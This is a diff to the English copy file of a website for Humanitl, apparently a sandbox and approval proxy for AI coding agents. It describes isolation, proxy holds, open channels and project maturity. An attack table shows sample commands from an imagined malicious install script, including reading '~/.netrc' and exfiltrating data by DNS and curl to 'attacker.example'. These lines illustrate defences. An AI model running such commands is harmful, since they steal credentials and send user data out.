@@ -82,32 +82,203 @@ const en: Copy = {
       },
     ],
   },
-  guarantees: {
-    title: 'Physics, not trust.',
-    lede: 'Three guarantees, all checkable with one command that starts its own short-lived sandbox. Each session measures them after the agent has started, and a red result stops the session. On Linux with bubblewrap and seccomp, on macOS with Seatbelt. Two channels stay open and visible: the project folder and the declared connection to the language model.',
-    items: [
-      {
-        title: 'No way out.',
-        text: 'On Linux the sandbox has no network interface. On macOS every connection except the door ends in EPERM.',
-      },
-      {
-        title: 'Exactly one door.',
-        text: 'On Linux a single socket leads out of the sandbox, on macOS the proxy socket and the session’s loopback port. All of it ends at Humanitl, where rules or you decide.',
-      },
-      {
-        title: 'The kernel holds.',
-        text: 'seccomp on Linux, a Seatbelt profile on macOS: the agent cannot open a new door for itself.',
-      },
-    ],
-    check: 'Check all three at once:',
-    more: 'The security argument',
-  },
   closing: {
-    title: 'Keep your hand on the network.',
-    text: 'Free and open source. No account, no cloud: Humanitl runs on your machine.',
     cta: 'Download Humanitl',
     ctaMac: 'Download Humanitl for macOS',
     ctaLinux: 'Download Humanitl for Linux',
+  },
+  home: {
+    attack: {
+      title: 'Four attempts. One reaches you.',
+      lede: 'Your agent installs a package you do not know. Its postinstall script runs along, inside the sandbox. This is what it does there:',
+      attempt: 'The script tries',
+      stop: 'Where it ends',
+      inside: 'Sandbox',
+      outside: 'Host',
+      rows: [
+        {
+          state: 'stop',
+          title: 'Read a token',
+          cmd: 'cat ~/.netrc',
+          verdict: 'Nothing to read',
+          text: 'Your home directory lies outside the sandbox. Where `.env` or `.npmrc` exist in the project, they are masked.',
+          systems: [
+            { os: 'Linux', text: 'An empty `/home/agent`, nothing from the host.' },
+            { os: 'macOS', text: 'From `/Users` only what belongs to the session.' },
+          ],
+        },
+        {
+          state: 'stop',
+          title: 'Hide data in a DNS name',
+          cmd: 'dig $DATA.attacker.example',
+          verdict: 'EPERM',
+          text: 'Nothing in the sandbox resolves names, and the query does not leave it.',
+          systems: [
+            { os: 'Linux', text: 'No `/etc/resolv.conf`, a UDP socket ends at the filter.' },
+            { os: 'macOS', text: '`sendto` is refused, `mDNSResponder` cannot be reached.' },
+          ],
+        },
+        {
+          state: 'stop',
+          title: 'Open a raw socket',
+          cmd: 'socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)',
+          verdict: 'EPERM',
+          text: 'The socket is never created.',
+          systems: [
+            { os: 'Linux', text: 'seccomp lets only `SOCK_STREAM` through.' },
+            { os: 'macOS', text: 'Refused at `socket(2)`.' },
+          ],
+        },
+        {
+          state: 'held',
+          title: 'Reach out with curl',
+          cmd: 'curl -d @data https://attacker.example/',
+          verdict: 'Waiting for you',
+          text: 'curl takes the door to the proxy. If no rule decides the request, the proxy holds it and shows you destination, headers and body.',
+          systems: [{ os: 'Linux, macOS', text: 'The same hold at the proxy on both systems.' }],
+        },
+      ],
+      note: 'An imagined run, not a recording. The behaviour at each station is documented, and the escape tests in CI check the barriers.',
+      more: 'The full path of a request',
+    },
+    why: {
+      title: 'Why it holds.',
+      lede: 'The proxy variables are only the convenient route. Enforcement sits outside the agent: in the kernel and in the proxy on your machine.',
+      figTitle: 'The path of one request',
+      figDesc:
+        'An attempt without the proxy ends at the wall of the sandbox. The request through the door is held in the proxy: the name stays text, headers and body are readable. Only after your approval is the name resolved once, the request goes to the destination and is recorded.',
+      replay: 'Play again',
+      fig: {
+        sandbox: 'Sandbox',
+        agent: 'Agent',
+        ghost: 'without proxy',
+        door: 'Door',
+        ca: 'ca.crt: only here',
+        proxy: 'Proxy on your machine',
+        name: 'name stays text',
+        body: 'body readable',
+        you: 'You',
+        dnsNote: 'only now, once',
+        dest: 'Destination',
+        audit: 'recorded',
+      },
+      claims: [
+        {
+          title: 'A tool that ignores the proxy fails.',
+          text: 'A tool that skips `HTTP_PROXY` hits the wall: `ENETUNREACH` on Linux, `EPERM` on macOS.',
+        },
+        {
+          title: 'A name is only resolved after approval.',
+          text: 'A DNS query alone can carry data. So Humanitl holds the host as text and asks only after approval, exactly once. ESC-3 checks this at the log of a recording name server.',
+        },
+        {
+          title: 'HTTPS content stays visible.',
+          text: 'Each installation creates its own CA. Its public certificate lies only in the sandbox, never in your system’s trust store. Programs with a built-in certificate fail visibly.',
+        },
+      ],
+      check: 'Check the sandbox yourself:',
+      checkNote:
+        '`humanitl sandbox check` starts its own short-lived sandbox. Each session measures the same three points after the agent has started; a red result stops the session.',
+      more: 'Check it yourself',
+    },
+    open: {
+      title: 'What stays open.',
+      statement: 'Humanitl does not say that no data can get out.',
+      lede: 'It says: over the network, only requests that you or a rule approved go out, and the declared passthrough to the model host.',
+      items: [
+        {
+          title: 'Your model',
+          text: 'Only what matches the declared passthrough goes without a hold: host, port, scheme, method and endpoint. Anything else to the same host, such as `POST /api/pull`, is held. The passthrough is recorded and scanned, and a finding only warns. The host sees every prompt, so it is part of what you trust.',
+        },
+        {
+          title: '`/work`',
+          text: 'The project directory is writable. What the agent leaves there, a human may carry out later.',
+        },
+        {
+          title: 'Approved requests',
+          text: 'What you approve or a rule allows goes out. So read what you approve.',
+        },
+        {
+          title: 'Responses and WebSocket frames',
+          text: 'They are recorded, not held. A response can contain prompt injection.',
+        },
+      ],
+      quietTitle: 'Three more declared channels, with no data path out',
+      quiet: [
+        { title: 'Terminal output', text: 'It comes from the agent: filtered, not trusted.' },
+        { title: 'Host names', text: 'In plain text in the recording and in every export. The export also carries paths, headers and bodies in plain text and says so first.' },
+        { title: 'Package caches', text: 'Per project, never shared across trust levels. They carry data between sessions of that project.' },
+      ],
+      macos: 'macOS gives less than Linux on five points. Each one is named.',
+      macosMore: 'The differences on macOS',
+      more: 'Every limit in detail',
+    },
+    daily: {
+      title: 'What it costs day to day.',
+      lede: 'Attention. Most of it on the first run, after that it depends on your rules.',
+      shotHeld: 'First run: requests wait',
+      shotRules: 'Rules: what none matches is held',
+      beats: [
+        {
+          title: 'The first run holds a lot.',
+          text: 'As long as no rule matches, a request waits for you. Without a package cache, a single install already costs approvals.',
+        },
+        {
+          title: 'Rules quiet it.',
+          text: 'The arrow next to Allow keeps a decision as a rule: for the session, an hour or for good. You can scope it tightly, such as `GET` on `*.github.com` while `POST` still asks.',
+        },
+        {
+          title: 'The price of a rule.',
+          text: 'What an `allow` rule matches goes out without a hold. You no longer see it beforehand, only afterwards in the history.',
+        },
+      ],
+      timeout: {
+        title: 'When nobody answers',
+        verdict: 'Blocked, never allowed.',
+        text: 'If a held request gets no answer for 300 seconds (the default), it is blocked and the agent gets `504`. A blocked agent is the intended outcome.',
+      },
+      more: 'The rule language',
+    },
+    support: {
+      title: 'What it runs with. What it does not.',
+      lede: 'Where things stand today, so you do not find out after installing.',
+      topic: 'Area',
+      yes: 'Works',
+      no: 'Does not work',
+      rows: [
+        {
+          topic: 'Agents',
+          yes: ['OpenCode and pi, each with its own adapter', 'Your own adapter, compiled into the daemon'],
+          no: ['No adapter for Claude Code, Codex or Aider'],
+        },
+        {
+          topic: 'Models',
+          yes: ['Any OpenAI-compatible server or Ollama'],
+          no: [],
+        },
+        {
+          topic: 'Systems',
+          yes: ['Linux x86_64: Debian 13, Ubuntu 24.04 and newer', 'macOS 12 or newer, Apple Silicon and Intel; tested on 15 and 27'],
+          no: ['Windows is not supported'],
+        },
+      ],
+      more: 'Agent profiles and adapters',
+    },
+    maturity: {
+      title: 'Early and in the open.',
+      lede: 'Humanitl runs on your machine and sends us nothing: no account, no telemetry, no crash reports.',
+      facts: [
+        { k: 'Version', v: '0.0.x' },
+        { k: 'Project', v: 'One maintainer' },
+        { k: 'License', v: 'GPL-3.0' },
+        { k: 'Releases', v: 'Unsigned before 1.0.0' },
+      ],
+      sumsTitle: 'What `SHA256SUMS` does',
+      sumsYes: 'Protects against a damaged download.',
+      sumsNo: 'Does not protect against a tampered release.',
+      sumsNote: 'Signed packages come with 1.0.0. On macOS the app is signed ad hoc only, so you allow the first start once in System Settings.',
+      more: 'All downloads and checksums',
+    },
   },
   download: {
     title: 'Download',
